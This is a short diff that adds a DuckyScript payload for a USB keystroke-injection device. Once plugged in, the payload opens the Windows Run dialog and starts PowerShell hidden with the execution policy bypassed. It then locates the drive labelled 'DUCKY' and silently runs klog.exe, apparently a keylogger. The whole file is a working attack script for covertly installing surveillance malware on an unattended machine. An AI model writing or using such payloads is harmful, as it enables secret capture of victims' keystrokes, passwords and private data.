@@ -1,0 +1,7 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "$dL = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'DUCKY' } | select name; cd $dL.name; .\klog.exe"
+DELAY 500
+ENTER
+
